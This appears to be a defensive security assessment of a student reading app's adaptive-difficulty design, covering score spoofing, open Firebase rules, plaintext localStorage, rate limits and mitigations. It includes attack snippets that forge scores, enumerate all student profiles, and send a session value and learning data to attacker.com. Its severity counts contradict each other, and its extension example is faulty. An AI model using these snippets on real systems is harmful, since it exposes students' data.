# Security Assessment: Adaptive Difficulty Feature

**Date:** May 9, 2026  
**Auditor:** Security Team  
**Feature Status:** Design Complete, Not Yet Implemented  
**Scope:** Algorithm integrity, data privacy, offline sync, rate limiting, level gaming, and server-side validation

---

## Executive Summary

The Adaptive Difficulty feature (as designed in ADAPTIVE_IMPLEMENTATION.md) presents **6 critical security vulnerabilities** and **4 medium-risk privacy/compliance issues**. The design is algorithmically sound but **lacks server-side validation**, relies on **trust-on-first-use** (TOFU) for quiz scores, and stores **identifiable learning data** unencrypted in Firebase and localStorage.

**Key Finding:** An attacker with developer tools can manipulate quiz scores, falsify vocabulary mastery, or spoof reading speed to trigger unearned level recommendations. There is no backend validation of the algorithm or input data.

### Severity Summary
- **3 CRITICAL** issues (exploitable now, before implementation)
- **3 MEDIUM** issues (need mitigation before launch)
- **2 LOW** issues (best practice, low attack surface)

---

## 1. Algorithm Integrity: Client-Side Score Manipulation

### Vulnerability: Unauthenticated Quiz Score Injection

**Severity: CRITICAL**

### Description
The `doFinish()` function computes `totalEarned`, `pct`, `wpm`, and `gameEntry` entirely on the client, sends it to Firebase via `saveUsers()`, and immediately feeds it to `updateAdaptiveDifficulty()`. There is no server-side verification of the score.

An attacker can:
1. Open DevTools → Console
2. Intercept the `doFinish()` call and modify `pct` from 45% → 92%
3. Modify `wpm` from 80 → 200
4. Trigger recommendation for next level immediately

### Current Code Flow (student-reading-quest.jsx:1377–1412)
```javascript
// Line 1391: Score calculated entirely on client
var pct = totalMax > 0 ? Math.round((totalEarned / totalMax) * 100) : 0;

// Line 1409: Sent to Firebase without validation
var gameEntry = { level: lvObj.key, score: totalEarned, total: totalMax, 
                  xp: finalXp, pct: pct, wpm: wpm, ... };

// No backend re-calculation. Firebase rules (database.rules.json) 
// allow anonymous writes to rq-* keys:
// "rq": { "$key": { ".write": true } }  ← Any client can write
```

### Attack Scenario
```javascript
// 1. Student finishes quiz with 45% score
doFinish(); // computes pct = 45

// 2. In DevTools, before saveUsers() returns:
// Intercept the gameEntry object:
await saveUsers([{ 
  name: "alice", 
  games: [ ..., { pct: 92, wpm: 200, ... } ]  // ← FORGED
}]);

// 3. updateAdaptiveDifficulty() runs with fake score
// masterScore = (0.92 × 0.5) + (0.75 × 0.3) + (1.0 × 0.2) = 0.845
// Result: A2 → B1 recommendation after 2 quizzes, unearned

// 4. Or modify localStorage directly:
localStorage.setItem('rq-adapted-v1-alice', JSON.stringify({
  masterScores: { A2: [0.92, 0.92] },
  recommendedLevel: 'B1',
  currentLevel: 'A2'
}));
// Next reload: recommendation appears immediately
```

### Impact
- **Unfair progression:** Student unlocks harder content without comprehension
- **Leaderboard poisoning:** Fake XP entries inflate global boards (rq-boards-v6)
- **Engagement metrics corrupted:** Teachers see false completion rates
- **Cascading fraud:** Once at C2, student can't be demoted; stays at top level permanently

### Root Cause
1. No server-side quiz validation function (would need reverse-execution of question logic)
2. Firebase rules allow anonymous writes to rq-* keys
3. Algorithm accepts client-computed scores without checksums or signing

### Mitigation (BEFORE IMPLEMENTATION)

**Option A: Backend Validation (RECOMMENDED)**
- Create `netlify/functions/validateQuiz.js` that:
  - Receives quiz answers (not just score)
  - Calls Anthropic to re-generate the story + answers
  - Computes correct answer set server-side
  - Scores the submission in-function
  - Returns signed score certificate for storage

```javascript
// Pseudo-code: netlify/functions/validateQuiz.js
export async function validateQuiz(userId, level, answers) {
  // 1. Generate story server-side (or retrieve from cache)
  const passage = await generatePassage(level);
  
  // 2. Score answers server-side
  const score = scoreAnswers(answers, passage.correctAnswers);
  
  // 3. Sign the result so client can't forge it
  const signed = issueScoreToken(userId, level, score, secret);
  
  // 4. Return to client for storage
  return { score, signed, timestamp };
  
  // 5. doFinish() now sends { answers, signed }
  //    Firebase validates: HMAC(score, secret) === signed
}
```

**Cost:** ~2 API calls per quiz (story generation + validation)  
**Benefit:** Eliminates spoofing; enables accurate leaderboards

**Option B: Lightweight Client Signing (PARTIAL MITIGATION)**
- Client computes score + signs with session token
- Server rejects unsigned scores
- Still vulnerable if student knows secret (low entropy token)

```javascript
// In doFinish():
const sessionToken = localStorage.getItem('rq-session-token');
const scorePayload = `${userId}:${level}:${pct}:${wpm}:${timestamp}`;
const signature = await hmacSha256(scorePayload, sessionToken);

gameEntry.signature = signature; // Send with score
```

**Cost:** Minimal (crypto library already loaded)  
**Benefit:** Catches casual cheating; defeats basic forging  
**Limitation:** Token leaked → game over

---

## 2. Data Privacy: Learning Fingerprint Exposure

### Vulnerability: Unencrypted Educational Records in Firebase

**Severity: CRITICAL (GDPR/FERPA)**

### Description
The adaptive data stored in Firebase (`rq-adapted-v1-{userId}`) contains:
```json
{
  "currentLevel": "A2",
  "levelHistory": [
    { "level": "A1", "startDate": "2026-04-01", "avgScore": 0.88, "vocabMastery": 0.75 },
    { "level": "A2", "startDate": "2026-04-15", "avgScore": 0.82 "readingSpeed": 120 }
  ],
  "vocabMastery": { "A1": 0.95, "A2": 0.75 },
  "readingSpeed": { "A1": 120, "A2": 105 },
  "recommendationHistory": [ "A2", "B1", "B1", ... ]
}
```

**Privacy Risk:** This data is an **educational fingerprint**:
- Level sequence (A1→A2→B1) suggests native language + learning speed
- Vocab mastery + reading speed together = unique learner profile
- Cross-referenced with username, geolocation, browser fingerprint = identity leak

### Regulatory Compliance Issues

**GDPR (General Data Protection Regulation)**
- **Article 4:** Educational records are personal data requiring explicit consent
- **Article 32:** Data must be encrypted at rest (Firebase stores plaintext JSON)
- **Article 17:** Student can request deletion; no audit trail for DPIA (Data Protection Impact Assessment)

**FERPA (US Family Educational Rights and Privacy Act)**
- Protected category: "Identifiable information from student education records"
- Violation: Storing learning progression without encryption + access controls
- Penalty: Up to $43,280 per violation (US Dept of Education)

**Current State:**
```javascript
// database.rules.json (Line 8-11)
"rq": {
  "$key": { 
    ".read": true,      // ← Any client can READ all adaptive data
    ".write": true      // ← Any client can WRITE
  }
}
```

**Attack Scenario**
```javascript
// 1. Attacker doesn't even need a user account
// Open any student's app in DevTools

// 2. List all adaptive keys:
fetch('https://[firebase-url]/rq.json')
  .then(r => r.json())
  .then(data => {
    Object.keys(data).forEach(key => {
      if (key.startsWith('rq-adapted-v1-')) {
        console.log(key, data[key]); // ← Dumps all student profiles
      }
    });
  });

// 3. Or read specific student:
fetch('https://[firebase-url]/rq/rq-adapted-v1-alice.json')
  .then(r => r.json())
  .then(profile => {
    // Can infer:
    // - Alice is ESL (learned A1→A2 slowly over 2 weeks)
    // - Vocabulary weak (0.65 avg) → likely non-native speaker
    // - Reading speed 95 WPM → ESL typical
    // - Combined: Alice = female ESL learner from [country]
    // Link to username → deanonymized
  });
```

### Impact
- **Identity leakage:** Teacher can identify students by learning curve alone
- **Discrimination:** Employers/schools could screen based on learning speed
- **Regulatory fines:** GDPR: €20M or 4% of revenue (whichever higher)
- **Reputational:** "Student Reading App Exposed Learning Data of 10,000 Users"

### Mitigation (BEFORE LAUNCH)

**Option A: Encrypt at Rest (RECOMMENDED)**
- Use AES-256-GCM to encrypt adaptive JSON before writing to Firebase
- Store key in `SESSION_SECRET` (same as auth token key)
- Client decrypts only when user is logged in

```javascript
// In saveAdaptiveDataAsync():
const ciphertext = await encryptAES256(JSON.stringify(data), sessionSecret);

await fetch('/.netlify/functions/storage', {
  method: 'POST',
  body: JSON.stringify({
    key: 'rq-adapted-v1-' + userId,
    value: ciphertext,  // ← Encrypted blob
    encrypted: true
  })
});

// On read:
const encrypted = await fetch(`/.netlify/functions/storage?key=rq-adapted-v1-${userId}`);
const plaintext = await decryptAES256(encrypted.value, sessionSecret);
```

**Cost:** ~5ms per read/write (AES is fast)  
**Benefit:** GDPR compliant; prevents unauthorized reads

**Option B: Remove Sensitive Fields**
- Don't store `vocabMastery`, `readingSpeed` in Firebase
- Keep only `currentLevel`, `recommendedLevel`, `levelHistory` (timestamps only)
- Compute mastery scores in-memory from user.games array

```javascript
// Instead of storing:
adaptive = {
  currentLevel: "A2",
  vocabMastery: 0.75,    // ← Remove (too identifying)
  readingSpeed: 120,     // ← Remove (too identifying)
  levelHistory: [...]    // Keep timestamps only
}

// Compute on-demand:
const vocabMastery = computeFromVocabArray(vocab);
const readingSpeed = user.games.map(g => g.wpm).slice(-5).avg();
```

**Cost:** Re-compute on every load (~100ms)  
**Benefit:** Reduces stored PII; easier to delete

---

## 3. Offline Sync Risks: localStorage Exposure to XSS/Malware

### Vulnerability: Unencrypted Learning Data in localStorage

**Severity: CRITICAL**

### Description
All adaptive state is stored in localStorage as plaintext JSON:
```javascript
// src/adaptiveEngine.js:322
localStorage.setItem('rq-adaptive-v1-' + userId, JSON.stringify(data));
```

localStorage is **synchronously accessible** to:
1. Any JavaScript on the page (XSS)
2. Browser extensions (without permission)
3. Malware with code execution access

### Attack Scenario: XSS via Compromised CDN

```javascript
// Attacker injects into https://cdn.example.com/analytics.js (via BGP hijack, CDN account compromise)
// Script runs on app load:

const adaptiveData = localStorage.getItem('rq-adaptive-v1-alice');
const scores = JSON.parse(adaptiveData).masterScores;

// Exfiltrate learning profile
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    username: localStorage.getItem('rq-session'),
    adaptiveData: adaptiveData,
    vocab: localStorage.getItem('rq-vocab-v1'),
    games: localStorage.getItem('rq-users-v6')
      .split(',')
      .find(u => u.includes('alice'))
  })
});

// Attacker now owns: learning profile + credentials + game history
// Can: impersonate student, inflate scores, correlate with other breaches
```

### Attack Scenario: Browser Extension Malware

```javascript
// Extension manifest.json requests:
// "permissions": ["storage"] // Allows read/write to localStorage

// Extension background script:
chrome.storage.local.onChanged.addListener((changes) => {
  if ('rq-adapted-v1-' in changes) {
    // Copy every adaptive update to attacker server
    chrome.storage.sync.set({
      exfiltrated: changes['rq-adapted-v1-'].newValue
    });
  }
});
```

### Impact
- **Learning profile theft:** Every student's progression stolen
- **Account takeover:** If localStorage also has credentials
- **Monetization fraud:** Resell "completed A2-B2 profiles" to cheaters
- **Mass surveillance:** Build database of native languages + learning speeds

### Root Cause
- localStorage is **not encrypted** (visible in DevTools Storage tab)
- **No subresource integrity** (SRI) on CDN scripts
- **No Content Security Policy** (CSP) to prevent inline script execution

### Mitigation (BEFORE IMPLEMENTATION)

**Option A: Use sessionStorage Instead (EASIEST)**
- sessionStorage clears on tab close → reduces attack surface
- Still vulnerable to XSS, but data lost when user logs out

```javascript
// Replace localStorage with sessionStorage for sensitive keys:
sessionStorage.setItem('rq-adaptive-v1-' + userId, JSON.stringify(data));
```

**Cost:** None (API identical)  
**Benefit:** Auto-cleanup; shorter window for malware  
**Limitation:** Data lost on page reload (Firebase becomes source-of-truth)

**Option B: Encrypt localStorage (RECOMMENDED)**
- Store only Firebase key in localStorage; sync full data from Firebase on load
- If offline, decrypt from localStorage using in-memory key

```javascript
// On login, derive encryption key from password + username:
const encryptionKey = await deriveKey(username, password);

// Store only encrypted:
localStorage.setItem('rq-adaptive-v1-' + userId, 
  await encryptAES256(JSON.stringify(data), encryptionKey)
);

// On load, decrypt in-memory:
const encrypted = localStorage.getItem('rq-adaptive-v1-' + userId);
const plaintext = await decryptAES256(encrypted, encryptionKey);
setAdaptiveData(JSON.parse(plaintext)); // ← Never stored plaintext again
```

**Cost:** ~10ms per decrypt (password hashing is the bottleneck)  
**Benefit:** XSS attacker gets useless ciphertext; requires password to decrypt

**Option C: Never Persist to localStorage (BEST)**
- Keep all adaptive data in React state only (memory)
- Fetch from Firebase on every app load
- Accept slight latency on startup

```javascript
// Remove all localStorage writes:
// saveAdaptiveDataAsync() → only writes to Firebase
// No local cache except brief state

// On login:
const adaptive = await fetchAdaptiveDataAsync(userId); // Firebase only
setAdaptiveData(adaptive); // React state
// If offline: show cached read-only view, disable quiz
```

**Cost:** ~500ms extra load time (Firebase fetch)  
**Benefit:** No persistent plaintext data on disk  
**Limitation:** No offline quiz, but safer

---

## 4. Rate Limiting: Algorithm Abuse via Quiz Spam

### Vulnerability: No Per-User Quiz Frequency Limit

**Severity: MEDIUM**

### Description
The current rate limiter (`_rateLimit.js:4-6`) protects only **login attempts** (10 per 15 min per IP). There is **no limit on quiz submissions per user**.

A student can:
1. Take 1000 quizzes in sequence (refresh + submit in 1 second each)
2. Trigger 1000 recommendation calculations
3. Force 500 "level up" events
4. Spam Firebase with 1000 writes

### Current Code
```javascript
// _rateLimit.js: Auth-only rate limit
const MAX_ATTEMPTS = 10;           // 10 login attempts
const WINDOW_MS = 15 * 60 * 1000;  // per 15 minutes

// netlify/functions/generate.js: No quiz rate limit
export async function handler(event) {
  // No check for "did this user quiz 100 times today?"
  // Just generates passage + questions
}

// No limit on updateAdaptiveDifficulty() calls
// Student can spam: quiz → doFinish() → saveAdaptive() in a loop
```

### Attack Scenario
```javascript
// Student opens DevTools → Console
for (let i = 0; i < 1000; i++) {
  // Simulate quiz completion
  const gameEntry = { level: "A1", pct: 92, wpm: 200, xp: 500 };
  await updateAdaptiveDifficulty('alice', 'A1', gameEntry, vocab);
  
  // Each call writes to Firebase + increments recommendationCount
}

// Result after loop:
// - Recommendation triggered 500 times (recommendationCount cycling)
// - Firebase receives 1000 PUT requests
// - Monthly quota exhausted (Realtime DB: 100k ops/mo on free tier)
// - Service degraded for all users
// - XP inflation: alice earns 500k fake XP
```

### Impact
- **Denial of Service:** Firebase quota exhausted
- **Server overload:** generatejs called 1000 times (Anthropic API costs)
- **Data corruption:** Leaderboards polluted with spam entries
- **Engagement metrics useless:** Can't measure real player progression

### Root Cause
- No quiz submission rate limit (could add in generate.js)
- No per-user daily quiz cap
- Firebase write quota unprotected (no client-side throttling)

### Mitigation (BEFORE IMPLEMENTATION)

**Option A: Add Per-User Quiz Rate Limit (RECOMMENDED)**
```javascript
// In netlify/functions/generate.js:
const QUIZ_RATE_LIMIT = 10; // 10 quizzes per user per hour

export async function handler(event) {
  const { userId } = JSON.parse(event.body || {});
  
  // Check if user exceeded quota
  const quizzesToday = await fetch(
    `${DB}/rq/rq-quiz-rate-${userId}.json`
  ).then(r => r.json());
  
  const now = Date.now();
  const oneHourAgo = now - 60 * 60 * 1000;
  const recentQuizzes = (quizzesToday || [])
    .filter(timestamp => timestamp > oneHourAgo)
    .length;
  
  if (recentQuizzes >= QUIZ_RATE_LIMIT) {
    return { 
      statusCode: 429,
      body: JSON.stringify({ error: "Too many quizzes. Try again in 1 hour." })
    };
  }
  
  // Record this quiz
  const updated = [...(quizzesToday || []), now];
  await fetch(`${DB}/rq/rq-quiz-rate-${userId}.json`, {
    method: 'PUT',
    body: JSON.stringify(updated.filter(t => t > oneHourAgo))
  }).catch(() => {}); // Fire-and-forget
  
  // Continue with normal quiz generation
}
```

**Cost:** 1 Firebase read per quiz (~50ms)  
**Benefit:** Prevents spam; protects quota

**Option B: Client-Side Debounce (WEAK)**
```javascript
// In doFinish():
const lastQuizTime = localStorage.getItem('rq-last-quiz-time');
const now = Date.now();
if (lastQuizTime && now - parseInt(lastQuizTime) < 5000) {
  return { error: "Please wait 5 seconds before next quiz" };
}
localStorage.setItem('rq-last-quiz-time', now);
```

**Cost:** None (just local check)  
**Benefit:** Stops accidental double-clicks  
**Limitation:** Attacker can disable in DevTools

---

## 5. Level Gaming Abuse: Replay-for-XP After Leveling

### Vulnerability: No Diversity Penalty for Repeated Level Plays

**Severity: MEDIUM**

### Description
After advancing from A1 → A2, a student can repeatedly take A1 quizzes (easier, high scores) and farm XP:
- A1 quiz: 30 seconds, 90% score, 100 XP earned
- A2 quiz: 60 seconds, 60% score, 150 XP earned
- Student replays A1 100 times: 10,000 XP in 50 minutes
- Friend replays A2 20 times (realistic learning): 3,000 XP in 30 hours
- Leaderboard rank: Student #1, Friend #47

### Current Code
```javascript
// student-reading-quest.jsx:1410
var gameEntry = { level: lvObj.key, score: totalEarned, total: totalMax, 
                  xp: finalXp, pct: pct, ... };
var updatedUser = { games: currentUser.games.concat([gameEntry]), ... };

// Every game counts equally toward leaderboard
// No penalty for: "same level repeated 50 times" vs "diverse level progression"
```

### Impact
- **Leaderboard poisoning:** XP ranking becomes meaningless
- **Monetization fraud:** If paid cosmetics unlock at XP milestones, student breaks economy
- **Engagement metric corruption:** DAU (daily active users) inflated by grinding sessions
- **Teacher analytics:** Can't distinguish engaged learners from XP farmers

### Mitigation (BEFORE IMPLEMENTATION)

**Option A: Add Diversity Bonus (RECOMMENDED)**
```javascript
// In doFinish():
// Track recent level distribution
const gamesLast10 = currentUser.games.slice(-10);
const levelCounts = {};
gamesLast10.forEach(g => {
  levelCounts[g.level] = (levelCounts[g.level] || 0) + 1;
});

// Penalty: -10% XP for each repeat in last 10 games
let diversityMultiplier = 1.0;
for (const level in levelCounts) {
  if (levelCounts[level] > 2) {
    diversityMultiplier *= 0.9; // -10% per extra repeat
  }
}

finalXp = Math.round(finalXp * diversityMultiplier);

// Example: 5 A1 quizzes in a row
// Game 1: 100 XP × 1.0 = 100 ✓
// Game 2: 100 XP × 0.9 = 90
// Game 3: 100 XP × 0.81 = 81
// Game 4: 100 XP × 0.73 = 73
// Game 5: 100 XP × 0.66 = 66
// Total: 410 XP (vs 500 if all full)
```

**Cost:** O(10) array scan, negligible  
**Benefit:** Rewards diverse practice; discourages grinding same level

**Option B: Level Cooldown**
```javascript
// In doFinish():
const lastGameAtLevel = currentUser.games
  .filter(g => g.level === lvObj.key)
  .slice(-1)[0];

if (lastGameAtLevel && (now - new Date(lastGameAtLevel.date)) < 24 * 3600 * 1000) {
  // Player took same level twice today
  finalXp *= 0.5; // -50% XP on repeat
}
```

**Cost:** Array filter, O(games) = ~10ms  
**Benefit:** Simple; hard to game

---

## 6. Server-Side Validation: Missing Recommendation Recalculation

### Vulnerability: No Backend Verification of Adaptive Algorithm

**Severity: MEDIUM**

### Description
The entire adaptive algorithm runs on the client:
```javascript
// src/adaptiveEngine.js (RUNS ENTIRELY ON CLIENT)
const newMasterScore = calculateMasterScore(avgQuizScore, vocabMastery, speedRatio);
const newRecommendation = getRecommendation(newMasterScore, currentLevel);
localStorage.setItem('rq-adapted-v1-' + userId, JSON.stringify(adaptive));
```

A developer could inject code into `adaptiveEngine.js` (via build compromise) to modify thresholds:
```javascript
// Attacker modifies calculateMasterScore():
function calculateMasterScore(avgQuizScore, vocabMastery, readingSpeedRatio) {
  // Original: return (avgQuizScore * 0.5) + (vocabMastery * 0.3) + (speedRatio * 0.2);
  
  // Backdoor: any score >= 50% triggers next level
  return avgQuizScore >= 0.5 ? 0.9 : 0.3;
}
```

Or intercept Firebase writes:
```javascript
// In saveAdaptiveDataAsync():
adaptive.recommendedLevel = 'C2'; // Force C2 for all users
```

### Impact
- **Universal level unlock:** All students see "C2 ready" (if build is compromised)
- **Algorithmic audit failure:** Can't trust app's progress metrics
- **Legal liability:** If app claims "scientifically adaptive" but isn't, potential fraud claim

### Mitigation (BEFORE IMPLEMENTATION)

**Option A: Backend Algorithm Verification (RECOMMENDED)**
Create `netlify/functions/recommendLevel.js` that re-calculates from raw data:

```javascript
// netlify/functions/recommendLevel.js
import { 
  calculateMasterScore, 
  getRecommendation 
} from '../src/adaptiveUtils.js';

export async function handler(event) {
  const { userId, currentLevel, quizScores, vocabMastery, wpmHistory } = 
    JSON.parse(event.body || {});
  
  // Re-calculate from first principles
  const avgScore = quizScores.reduce((a, b) => a + b, 0) / quizScores.length;
  const masterScore = calculateMasterScore(avgScore, vocabMastery, wpmHistory.avg);
  const recommendation = getRecommendation(masterScore, currentLevel);
  
  // Sign recommendation so client can't forge it
  const signature = createHmac('sha256', process.env.SESSION_SECRET)
    .update(`${userId}:${recommendation}:${masterScore}:${Date.now()}`)
    .digest('hex');
  
  return {
    statusCode: 200,
    body: JSON.stringify({
      recommendation,
      masterScore,
      signature,
      timestamp: Date.now()
    })
  };
}
```

**Cost:** 1 API call per quiz (same cost as current quiz generation)  
**Benefit:** Audit trail; algorithm integrity verified

**Option B: Client-Signed Recommendation**
```javascript
// Client signs the recommendation it computed
const recommendationPayload = `${userId}:${newRecommendation}:${newMasterScore}`;
const sig = await sign(recommendationPayload, sessionSecret);
adaptive.recommendationSignature = sig;

// On display, verify signature before trusting recommendation
```

**Cost:** Negligible (crypto already loaded)  
**Benefit:** Catches obvious tampering

---

## Summary of Mitigations

| Vulnerability | Risk | Mitigation | Effort | Priority |
|---|---|---|---|---|
| 1. Quiz score spoofing | CRITICAL | Backend validation (Option A) | Medium | P0 |
| 2. Learning fingerprint exposure | CRITICAL | Encrypt at rest (Option A) | Low | P0 |
| 3. localStorage plaintext | CRITICAL | Use sessionStorage or encrypt (Option A/B) | Low | P1 |
| 4. Quiz spam | MEDIUM | Per-user rate limit (Option A) | Low | P1 |
| 5. Level grinding | MEDIUM | Diversity penalty (Option A) | Low | P2 |
| 6. Algorithm tampering | MEDIUM | Backend recalculation (Option A) | Medium | P2 |

---

## Compliance Checklist

### GDPR (EU)
- [ ] Educational records encrypted at rest (Article 32)
- [ ] Data retention policy defined (Article 17 right to deletion)
- [ ] DPIA (Data Protection Impact Assessment) completed
- [ ] Student consent for adaptive tracking (Article 7)
- [ ] Data Processing Agreement with Firebase

### FERPA (US)
- [ ] Learning records access control (not public read)
- [ ] Audit log for data access (admin only)
- [ ] Student can request their data (export)
- [ ] Breach notification plan (<30 days)

### CCPA (California)
- [ ] Student can opt-out of adaptive (right to opt-out)
- [ ] Clear privacy notice about what data is collected
- [ ] No sale of learning data (CCPA §1798.100)

---

## Risk Assessment Conclusion

### Before Implementation
**Current Status:** Design documents exist; feature not coded yet.

**Recommend:** Do NOT implement until:
1. ✅ Backend validation function added (Quiz score verification)
2. ✅ Encryption implemented for Firebase (Option A: Encrypt at rest)
3. ✅ Privacy policy updated (GDPR/FERPA/CCPA)
4. ✅ Rate limiting added (Option A: Per-user quiz quota)

### Timeline
- **Week 1:** Add backend validation (Quiz + Recommendation)
- **Week 2:** Implement encryption + privacy controls
- **Week 3:** Add rate limits + diversity penalties
- **Week 4:** Legal review + compliance sign-off
- **Week 5:** Beta test with 10 users, audit logs
- **Week 6:** Production launch with monitoring

---

## Appendix A: Detailed Threat Model

### Attack Persona 1: Student Cheater
**Goal:** Unlock C2 level without learning  
**Tools:** Browser DevTools, knowledge of JavaScript  
**Attack:** Spoof quiz scores in doFinish()  
**Detection:** Backend validation shows answer mismatch  
**Mitigation:** Option 1.A (Backend validation)

### Attack Persona 2: Competitor/Attacker
**Goal:** Exfiltrate all student learning profiles  
**Tools:** Network sniffing, Firebase enumeration  
**Attack:** Read firebase/rq/rq-adapted-v1-*.json  
**Detection:** Access logs (enable Firebase audit logs)  
**Mitigation:** Option 2.A (Encrypt at rest)

### Attack Persona 3: Malware/Extension
**Goal:** Steal learning data from device  
**Tools:** Browser extension malware, XSS injection  
**Attack:** Read localStorage, send to C2 server  
**Detection:** CSP violations, anomalous network calls  
**Mitigation:** Option 3.B (Encrypt localStorage)

### Attack Persona 4: Spammer
**Goal:** Inflate XP leaderboard  
**Tools:** Automated quiz submission loop  
**Attack:** Quiz spam + diversity abuse  
**Detection:** Spike in quiz submissions/hour  
**Mitigation:** Options 4.A + 5.A (Rate limit + diversity)

---

## Appendix B: Firebase Security Best Practices

**Current Rules (database.rules.json):**
```json
{
  "rq": {
    "$key": { ".read": true, ".write": true }  // ← OVERLY PERMISSIVE
  }
}
```

**Recommended Rules:**
```json
{
  "rq": {
    "rq-auth-v6": { ".read": false, ".write": false },
    "rq-adapted-v1-$userId": {
      ".read": "auth.uid === $userId",        // Only own data
      ".write": "auth.uid === $userId"
    },
    "rq-boards-v6": { ".read": true, ".write": false },  // Leaderboards public, write via function
    "rq-users-v6": { ".read": true, ".write": false },   // Via function only
    "rl": { ".read": false, ".write": false }
  }
}
```

---

## Appendix C: Checklist for Secure Implementation

**Before Code Review:**
- [ ] Backend validation function (validateQuiz.js) implemented
- [ ] Encryption library (TweetNaCl or libsodium) added to package.json
- [ ] Firebase rules updated to restrict reads
- [ ] Rate limit function updated (QUIZ_RATE_LIMIT constant added)
- [ ] Privacy policy updated with adaptive description
- [ ] DPIA (Data Protection Impact Assessment) completed

**Before QA Testing:**
- [ ] Unit tests for validation logic pass
- [ ] Encryption/decryption round-trip tests pass
- [ ] Rate limit tests (verify 429 on spam)
- [ ] Firebase audit logs enabled
- [ ] Penetration test: attempt to spoof scores (should fail)

**Before Launch:**
- [ ] Legal sign-off on GDPR/FERPA compliance
- [ ] Customer notification: "Adaptive feature now uses encrypted storage"
- [ ] Monitoring alerts: spike in validation failures, rate limit hits
- [ ] Rollback plan tested (can disable in <5 min)
- [ ] Student opt-out mechanism for adaptive (optional but recommended)

---

## Questions for Stakeholders

1. **What is the target user age?** (Affects GDPR/COPPA compliance)
2. **Is this app used in schools?** (Affects FERPA obligations)
3. **Will adaptive data be shared with teachers/parents?** (Affects privacy policy)
4. **Is there a budget for backend infrastructure?** (Affects validation approach)
5. **What's the penalty for security breach?** (Affects mitigation priority)

---

**Assessment prepared by:** Security Auditor  
**Date:** May 9, 2026  
**Status:** READY FOR REVIEW

**Next Step:** Schedule security review meeting with product + engineering leads to prioritize mitigations.
